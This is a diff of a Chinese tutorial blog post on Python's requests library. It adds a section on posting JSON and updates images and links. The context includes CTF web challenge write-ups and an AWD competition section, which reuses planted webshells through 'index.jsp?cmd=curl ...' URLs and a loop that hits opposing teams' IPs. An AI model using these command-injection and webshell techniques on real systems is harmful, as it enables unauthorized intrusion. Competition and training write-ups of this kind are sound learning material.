@@ -24,6 +24,7 @@ date: 2019-08-08 09:41:37
 ## 安装
 **方法一**：
 只要在你的终端中运行这个简单命令即可：
+
 ```
 $ pip install requests
 ```
@@ -130,7 +131,13 @@ GET请求参数作为查询字符串附加在URL末尾，可以通过`requests.g
 https://github.com/?username=jwt&id=1
 ```
 ### 传递POST请求参数
-`POST`请求参数以表单数据的形式传递，可以通过`requests.post()`方法中的`data`参数(dict类型变量)完成，具体代码如下：
+
+`POST`请求参数以表单数据的形式传递，可以通过`requests.post()`方法中的`data`参数(dict类型变量)或者`json`参数完成，由于github官网POST请求参数不以明文展现，此处改为了其他网站测试
+
+#### 使用data参数
+
+具体代码如下：
+
 ```python
 >>> args = {'username': 'jwt', 'id': 1}
 >>> r = requests.post("http://httpbin.org/post", data=args)
@@ -154,10 +161,62 @@ https://github.com/?username=jwt&id=1
   "json": null,
   "origin": "3.112.219.149, 3.112.219.149",
   "url": "https://httpbin.org/post"
+    
 ```
-由于github官网POST请求参数不以明文展现，此处改为了其他网站测试
+#### 使用json参数
+
+这里就记录一下如何用requests发送json格式的数据，因为一般我们post参数，都是直接post，没管post的数据的类型，此时其默认类型为：
+
+```
+application/x-www-form-urlencoded
+```
+
+但是，我们写程序的时候，最常用的接口post数据的格式是json格式。当我们需要post json格式数据的时候，怎么办呢，有两种方法：
+
+##### 1，在header中指定数据类型
+
+详见如下代码:
+
+```python
+import requests
+import json
+ 
+data = {
+    'a': 123,
+    'b': 456
+}
+ 
+## headers中添加上content-type这个参数，指定为json格式
+headers = {'Content-Type': 'application/json'}
+ 
+## post的时候，将data字典形式的参数用json包转换成json格式。
+response = requests.post(url='url', headers=headers, data=json.dumps(data))
+```
+
+##### 2，直接使用json参数
+
+现在较新版本的requests的post方法，已经默认提供一个json的参数，直接传入字典数据，自动完成以上的传话，使用json格式传输数据。
+
+代码如下：
+
+```python
+import requests
+ 
+data = {
+    'a': 123,
+    'b': 456
+}
+ 
+## post的时候，使用json参数
+response = requests.post(url='url', json=data)
+```
+
+就可以发送json格式数据了。
+
+参考：[python 使用requests发送json格式数据](https://amos-x.com/index.php/amos/archives/python-requests-send-json/)
 
 ### 传递Cookie参数
+
 >HTTP 协议是无状态的。因此，若不借助其他手段，远程的服务器就无法知道以前和客户端做了哪些通信。Cookie 就是手段之一。
 >Cookie 用于记录用户在网站上的登录状态。
 
@@ -215,6 +274,7 @@ print(r.text)
 6.cookie目的可以跟踪会话，也可以保存用户喜好或者保存用户名密码
 7.session用来跟踪会话
 ![利用 Cookie 管理 Session](https://i.loli.net/2019/08/08/CxvezroEm3OAQ26.png)
+
 ### HTTP代理
 如果需要使用代理，你可以通过为任意请求方法提供 proxies 参数来配置单个请求:
 ```python
@@ -279,6 +339,7 @@ proxies = {
 Hackbar手工提交 POST 请求会有什么效果：
 ![](https://i.loli.net/2019/08/08/qg9uGRwPW7svBNO.png)
 根据题目意思必须很快的提交，经过研究发现FLAG的值会改变，显然必须要用脚本来跑了，因此直接上 Python 脚本解题：
+
 ```python
 # -*- coding: utf-8 -*-
 # python 2
@@ -292,6 +353,7 @@ print(requests.post(url, data = postData).text)# 利用Post方式发送请求并
 ```
 运行脚本，得到flag
 ![](https://i.loli.net/2019/08/08/4BHYIawCf1KnPvM.png)
+
 ### 题目 速度要快
 题目来源：bugku
 题目链接：http://123.206.87.240:8002/web6/
@@ -312,7 +374,7 @@ Hackbar手工提交 POST 请求会有什么效果:
 根据题目意思必须很快的提交，经过研究发现flag的值会改变，显然必须要用脚本来跑了，因此直接上 Python 脚本解题
 但是直接用上题脚本发现，发现还是提示快一点
 因此查看GET请求和POST请求的`请求头`与`响应头`是否内有玄机
-![](https://i1.100024.xyz/i/2019/08/08/o1yizq.png)
+![](https://i.loli.net/2020/05/20/LwF4Kk3bJNmXvqs.png)
 果然如此，GET请求和POST请求的响应头的Set-Cookie值不相同，即不在同一个会话中，因此编写脚本
 **方法一**：
 
@@ -334,6 +396,7 @@ print(s.post(url, data = post).text)
 ![](https://i.loli.net/2019/08/08/zkJerUat28BfyA9.png)
 **方法二**：
 既然只需要保持两次请求中 Cookie 属性相同，那能不能构造 Cookie 属性通过普通的 get 与 post 方法完成呢？答案是可以的。请见如下代码：
+
 ```python
 # -*- coding: utf-8 -*-
 # python 2
@@ -351,15 +414,17 @@ print(requests.post(url, data = post, cookies = cookie).text)
 题目来源：bugku
 题目链接：http://123.206.87.240:8002/qiumingshan/
 题目信息：
-![](https://i1.100024.xyz/i/2019/08/08/nzzmu4.png)
+![](https://i.loli.net/2020/05/20/pZaRetgBlxoy2mJ.png)
+
 >依旧是跟前两题差不多，前面两题均是对响应头中与flag相关的属性做解码处理，然后快速发送一个 POST 请求得到 flag 值。而本题要求计算响应内容中的表达式，将结果用 POST 请求发送回服务器换取 flag 值。同样要利用会话对象 Session()，否则提交结果的时候，重新生成了一个新的表达式，结果自然错误。
 
 打开题目，查看源码
-![](https://i1.100024.xyz/i/2019/08/08/o07klc.png)
+![](https://i.loli.net/2020/05/20/VzFaq1GSdIZ4uUO.png)
 根据题目意思 必须2秒内计算给出算式的值
 但是不知道POST的key是什么，刷新页面再看看，得到请求参数的 key 值为`value`
-![](https://i1.100024.xyz/i/2019/08/08/o2d376.png)
+![](https://i.loli.net/2020/05/20/UJlxr18MNpqyTWg.png)
 经过研究发现算式会改变，再加上必须2秒内提交，显然必须要用脚本来跑了，因此直接上 Python 脚本解题
+
 ```python
 # -*- coding: utf-8 -*-
 # python 2
@@ -384,23 +449,28 @@ expression = re.search(r'(\d+[+\-*])+(\d+)', r).group()
 `[+\-*]`匹配一个加号，或一个减号，或一个乘号，注意减号在中括号内是特殊字符，要用反斜杠转义；
 `(\d+[+\-*])+`代表一个或多个由数字与运算符组成的匹配组；最后再加上剩下的一个数字`(\d+)`
 
-
 [Python 正则表达式](https://www.runoob.com/python/python-reg-expressions.html)
 [正则表达式](https://docs.python.org/zh-cn/2.7/library/re.html)
 运行脚本，就有一定的概率可以获得flag,经尝试与猜测只有当`Give me value post about...`界面出现提交才能得到flag
 所以多运行几次脚本flag就能得到了
-![](https://i1.100024.xyz/i/2019/08/08/pr0xw4.png)
+
+![](https://i.loli.net/2020/05/20/yctYRWMpibT1wHP.png)
+
+
 ### 题目 快速口算
+
 题目来源：网络信息安全攻防学习平台
 题目链接：http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php
 题目信息：
-![](https://i1.100024.xyz/i/2019/08/08/pls7el.png)
+![](https://i.loli.net/2020/05/20/xkZeTPyhrtK7Opb.png)
+
 >跟上一题原理一样，唯一不同就是正则表达式稍有变动，因为两题算式形式略有不同
 
 打开题目，查看源码
-![](https://i1.100024.xyz/i/2019/08/08/rbpahj.png)
+![](https://i.loli.net/2020/05/20/YmG8RXtfcyETKhM.png)
 根据题目意思 必须2秒内计算给出算式的值，源码中得到请求参数的 key 值为`v`
 解题脚本：
+
 ```python
 # -*- coding: utf-8 -*-
 # Python 2
@@ -418,7 +488,8 @@ print(s.post(url,data=postdata).content.decode('utf-8'))
 `+*()`匹配一个加号，或一个乘号，或一个括号
 `[0-9+*()]+`代表一个或多个由数字与运算符组成的匹配组；最后再加上剩下的一个后括号`[)]`
 运行脚本，得到flag
-![](https://i1.100024.xyz/i/2019/08/08/qm3cvj.png)
+![](https://i.loli.net/2020/05/20/jt2ZiEkPbwLaJnQ.png)
+
 ### 题目 cookies欺骗
 题目来源：bugku
 题目链接：http://123.206.87.240:8002/web11/
@@ -437,6 +508,7 @@ print(s.post(url,data=postdata).content.decode('utf-8'))
 出现一行代码，再试一下`line=2`显示了不同的代码
 ![](https://i.loli.net/2019/08/09/QxzrbNmg5GtvwCk.png)
 由此推断改变`line`值就能够读取`index.php`,但是手动改太麻烦，因此我们写一个脚本来读取`index.php`
+
 ```python
 import requests
 
@@ -457,17 +529,17 @@ for i in range(0,30):
 
 ## Request在AWD中实战
 ### 题目：JEECMS
+
 题目来源：2019四川省省赛AWD
 题目链接：链接：https://pan.baidu.com/s/1YpdKs8BwQpUuCosqNM_-9w 
 提取码：kg4y 
-题目信息：
-![](https://i1.100024.xyz/i/2019/08/08/rcab30.png)
 
 ssh连接，将源码down下来，D盾扫描
 ![](https://blog.xiafeng2333.top/content/images/2019/08/1.jpg)
 一共四个木马，两个多功能大马
-![](https://i1.100024.xyz/i/2019/08/08/sil1l0.png)
+![](https://i.loli.net/2020/05/20/YVCpkEZtAbcIRQ3.png)
 根据扫出的命令执行漏洞，直接获取flag手工提交
+
 ```php
 http://192.200.1.11:8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=curl http://192.200.0.70/remoteflag/
 http://192.200.1.12:8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=curl http://192.200.0.70/remoteflag/
@@ -497,7 +569,22 @@ for num in range(11,43):  #这个范围是打的ip是11-43的队伍
     print(r.text)
 ```
 参考：
-[快速上手-Requests](https://2.python-requests.org//zh_CN/latest/user/quickstart.html#cookie)
-[高级用法-Requests](https://2.python-requests.org//zh_CN/latest/user/advanced.html#advanced)
+[快速上手-Requests](https://requests.readthedocs.io/zh_CN/latest/)
+[高级用法-Requests](https://requests.readthedocs.io/zh_CN/latest/user/advanced.html)
 [详解CTF Web中的快速反弹POST请求](https://ciphersaw.me/2017/12/16/%E8%AF%A6%E8%A7%A3%20CTF%20Web%20%E4%B8%AD%E7%9A%84%E5%BF%AB%E9%80%9F%E5%8F%8D%E5%BC%B9%20POST%20%E8%AF%B7%E6%B1%82/)
 
+## 赞助💰
+
+如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭
+
+<table>
+  <tbody>
+     <tr>
+         <td style="text-align:center;">支付宝支付</td>
+         <td style="text-align:center;">微信支付</td>
+     </tr>
+   <tr>
+    <td style="text-align:center;" ><img width="200" src="https://jwt1399.top/medias/reward/alipay.png"></td>    
+      <td style="text-align:center;"><img width="200" src="https://jwt1399.top/medias/reward/wechat.png"></td>     
+  </tr>
+</tbody></table>
